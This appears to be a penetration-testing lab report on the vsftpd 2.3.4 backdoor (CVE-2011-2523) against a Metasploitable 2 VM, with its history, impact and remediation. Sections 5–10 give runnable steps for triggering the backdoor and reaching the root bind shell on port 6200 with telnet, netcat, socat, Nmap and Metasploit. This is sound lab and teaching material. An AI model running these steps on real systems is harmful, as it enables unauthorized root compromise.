# VULN-001 — vsftpd 2.3.4 Backdoor Command Execution

> **Assessment status: Not tested on my local VM.** This report contains verified **historical research and planned lab procedures**, **not observed exploit results**.
>
> [← Project home](../../../README.md) · [← Candidate index: NET-001](../../../FINDINGS-INDEX.md#net-001) · [Lab setup](../../../lab-setup/README.md)

## 1. Finding information

| Field | Detail |
| --- | --- |
| Finding ID | `VULN-001` |
| Catalog ID | `NET-001` |
| Name | vsftpd 2.3.4 malicious backdoor |
| Categories | `BD` Backdoors · `RCE` Remote Code Execution |
| CVE | [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) |
| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) (NVD classification); supply-chain compromise / hidden functionality is additional context |
| Published CVSS v3.1 | **9.8 Critical** ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)) |
| Target | Metasploitable 2 — isolated VM IP **TBD** |
| Service | FTP, TCP 21 |
| Backdoor listener | TCP 6200 |
| Possible impact | Unauthenticated **root** command execution |
| Local validation | **Not tested** |
| Manual testing | **Not attempted** |
| Metasploit testing | **Not attempted** |
| Test date / evidence | **Pending** |

## 2. Explanation and historical incident

**vsftpd** is the *Very Secure FTP Daemon*, a file transfer server for Unix/Linux. During **June 30–July 3, 2011**, a maliciously altered copy of the `vsftpd-2.3.4.tar.gz` source archive was distributed from a compromised download site. The software author, Chris Evans, disclosed the incident on **July 3, 2011**; it became a security advisory in early July. This is a **software supply-chain compromise**, not evidence that every legitimate vsftpd 2.3.4 build was malicious.

When a vulnerable FTP service receives a username containing the sequence ` :)` (specifically, the characters `:)`), the malicious code can activate a **bind shell on TCP 6200**. An attacker reaching that listener may execute operating-system commands with root privileges without knowing a valid FTP password.

```text
Kali Linux (tester)        Metasploitable 2 (isolated target)
   FTP request  ─────────► FTP service :21
   USER lab:)   ─────────► Tampered code triggers
                           Bind shell appears on :6200
   TCP :6200    ─────────► Shell
   id            ─────────► Potential uid=0(root)
```

**Technical distinction:** a version banner saying `vsFTPd 2.3.4` is an investigation lead, not conclusive proof of the backdoored build. Test the actual behavior.

## 3. Risk and impact

The published NVD severity is **CVSS 3.1 = 9.8 (Critical)**. Exploitation can compromise **confidentiality** (read sensitive files), **integrity** (modify files or settings), and **availability** (disrupt services). The malicious bind shell bypasses normal FTP authentication. In a training lab, use only non-destructive verification commands.

## 4. Lab preparation and service discovery

**Run only from Kali against the IP address of your own isolated Metasploitable 2 VM.**

```bash
# On the Metasploitable 2 console
ifconfig

# On Kali
ip -4 addr

# In a local clone, from the project root
TARGET=<YOUR_METASPLOITABLE_2_IP>
ping -c 3 "$TARGET"
sudo nmap -sV -p 21 -oN vulnerabilities/network/VULN-001-vsftpd-backdoor/scans/01-ftp-version.nmap "$TARGET"
```

**Expected investigative clue, not observed output:**
```text
21/tcp open ftp vsftpd 2.3.4
```

**Result:** Pending. Save actual Nmap results and evidence screenshot `screenshots/01-ftp-enumeration.png`.

## 5. Manual exploitation — Method A: Telnet

Telnet is a plain TCP client and can manually interact with the FTP protocol. This is the traditional method in Rapid7's Metasploitable 2 guide.

```bash
telnet "$TARGET" 21
```

Type the following into the FTP connection (do not include the `$` shell prompt):

```text
USER lab:)
PASS test
```

Close the FTP session after triggering the backdoor. In a **second Kali terminal**:

```bash
telnet "$TARGET" 6200
```

Enter harmless proof commands:

```text
id
whoami
hostname
pwd
exit
```

Successful `id` output might show `uid=0(root)`; capture **actual**, not assumed, results.

## 6. Manual exploitation — Method B: Netcat

To ensure FTP commands contain the proper CRLF line endings:

```bash
printf 'USER lab:)\r\nPASS test\r\n' | nc -nv -w 4 "$TARGET" 21
```

Then connect to the newly created shell listener:

```bash
nc -nv "$TARGET" 6200
```

Enter `id`, `whoami`, `hostname`, and `exit` interactively. A blank prompt can be normal for this raw command shell.

## 7. Manual exploitation — Method C: Python 3 sockets

Python reproduces the FTP protocol interaction directly, without Metasploit:

```bash
python3 vulnerabilities/network/VULN-001-vsftpd-backdoor/scripts/manual_vsftpd_backdoor.py "$TARGET"
```

See [the reviewed Python source](scripts/manual_vsftpd_backdoor.py). It sends the backdoor trigger, checks TCP 6200 and runs only `id`. It does not upload files, persist access, or alter the target. Verify the output yourself.

## 8. Manual exploitation — Method D: Socat / raw TCP clients

If `socat` is installed, it can be used like Telnet or Netcat:

```bash
socat - TCP:"$TARGET":21
```

Type `USER lab:)` and `PASS test`. In a second Kali terminal:

```bash
socat - TCP:"$TARGET":6200
```

Enter `id` and `exit`. **FTP clients and TCP libraries are different ways to trigger the same backdoor**, not separate CVEs.

## 9. Automated validation without Metasploit — Nmap NSE

Nmap has an official script which **actively triggers and checks the backdoor**, running a harmless `id` command. Unlike a simple version scan, this is an **intrusive validation test**, so use it only on your VM.

```bash
sudo nmap -p 21 --script ftp-vsftpd-backdoor \
  -oN vulnerabilities/network/VULN-001-vsftpd-backdoor/scans/02-nse-validation.nmap "$TARGET"
```

If the script reports `VULNERABLE (Exploitable)` and shows actual `uid=` output, preserve the result. [Nmap script documentation](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html).

## 10. Metasploit Framework

The matching module is `exploit/unix/ftp/vsftpd_234_backdoor`.

**Start a fresh target snapshot/reboot between manual and Metasploit methods if the backdoor port is already occupied.** Do not confuse an earlier port 6200 listener with a new successful exploit.

```text
msfconsole -q
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
info
show options
set RHOSTS <YOUR_METASPLOITABLE_2_IP>
set RPORT 21
show payloads
check
run
```

Inside a successfully opened shell/session, use `id`, `whoami`, `hostname`, then `exit`.

**Modern Metasploit compatibility note (verified against the module source):** The current upstream module defines **two targets**:

- **Target 0 — Linux/Unix Command:** defaults to a fetch-delivered Meterpreter payload, which can fail on the old Metasploitable 2 system due to incompatible runtime libraries.
- **Target 1 — Backdoor Command Shell:** configures `cmd/unix/interact` to interact directly with the bind shell. **This is the preferred target for our legacy lab**, where present.

After `use` and `set RHOSTS`, inspect the installed module:

```text
show targets
set TARGET 1
show payloads
show options
run
```

Only select target 1 if `show targets` labels it **Backdoor Command Shell**. A [previously reported compatibility issue](https://github.com/rapid7/metasploit-framework/issues/21780) affected versions of this module, and the standalone proposed [PR #21792](https://github.com/rapid7/metasploit-framework/pull/21792) was closed without merging. The current source **does** expose the dedicated direct-shell target. If your Kali installation is older and doesn't list that target or the compatible payload, document the mismatch, update Metasploit from trusted package sources as appropriate, or rely on the manual method rather than forcing incompatible payloads.

**Current upstream source:** [vsftpd_234_backdoor.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb).

**Metasploit status:** Not attempted on this VM.

## 11. Troubleshooting

| Symptom | Possible explanation / next step |
| --- | --- |
| TCP 21 closed | Wrong VM IP, network isolation mismatch, or FTP service not running |
| Banner not vsftpd 2.3.4 | Different FTP service/build; verify before proceeding |
| Port 6200 closed | Trigger didn't activate, listener closed, firewall or target mismatch |
| Port 6200 already open | Earlier exploit may have left the shell listening; connect carefully or reset VM |
| Shell connects but shows no prompt | Raw bind shells often have no friendly prompt; enter `id` |
| Metasploit runs but no session | Inspect `show targets` and prefer `Backdoor Command Shell` (usually target 1), rather than legacy-incompatible Meterpreter fetch |
| `cmd/unix/interact` not valid | Select the `Backdoor Command Shell` target first; an older module may lack this target |
| Nmap NSE succeeds but manual fails | Script may have triggered and consumed an existing single-use listener; reset before another attempt |

## 12. Remediation / verification

In a genuine environment: remove compromised binaries, reinstall from a trusted and integrity-verified source, check build/package provenance, rotate credentials if exposure is suspected, investigate possible compromise and unauthorized ports, restrict FTP access, and prefer maintained encrypted transfer alternatives (such as SFTP). For this lab, preserve vulnerability evidence and restore the VM snapshot after testing.

## 13. Screenshot and evidence checklist

- [ ] `screenshots/01-ftp-enumeration.png` — real FTP service detection
- [ ] `screenshots/02-manual-trigger.png` — actual trigger command and response
- [ ] `screenshots/03-manual-root-proof.png` — actual `id` output
- [ ] `screenshots/04-nmap-nse.png` — optional NSE result
- [ ] `screenshots/05-metasploit-options.png` — real module/options/payload
- [ ] `screenshots/06-metasploit-result.png` — real success **or failure** output
- [ ] `scans/01-ftp-version.nmap` — original scan result
- [ ] `scans/02-nse-validation.nmap` — optional active validation output

None of these evidence files have been collected or uploaded.

## 14. References

1. [NVD — CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
2. [Rapid7 — Metasploitable 2 exploitability guide](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
3. [HKCERT — 2011 compromised vsftpd source package bulletin](https://www.hkcert.org/security-bulletin/vsftpd-compromised-source-packages-backdoor-vulnerability)
4. [Nmap — ftp-vsftpd-backdoor NSE documentation](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)
5. [Rapid7 — Metasploit vsftpd module source](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb)
6. [Metasploit issue #21780 — modern payload incompatibility](https://github.com/rapid7/metasploit-framework/issues/21780)
7. [Metasploit PR #21792 — proposed compatibility fix (not merged)](https://github.com/rapid7/metasploit-framework/pull/21792)
8. [Original author's historical disclosure](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)

---

**Final result: Pending.** Change this to `Investigating` or `Confirmed` only after documenting your own commands, outputs, screenshots, and actual assessment date.
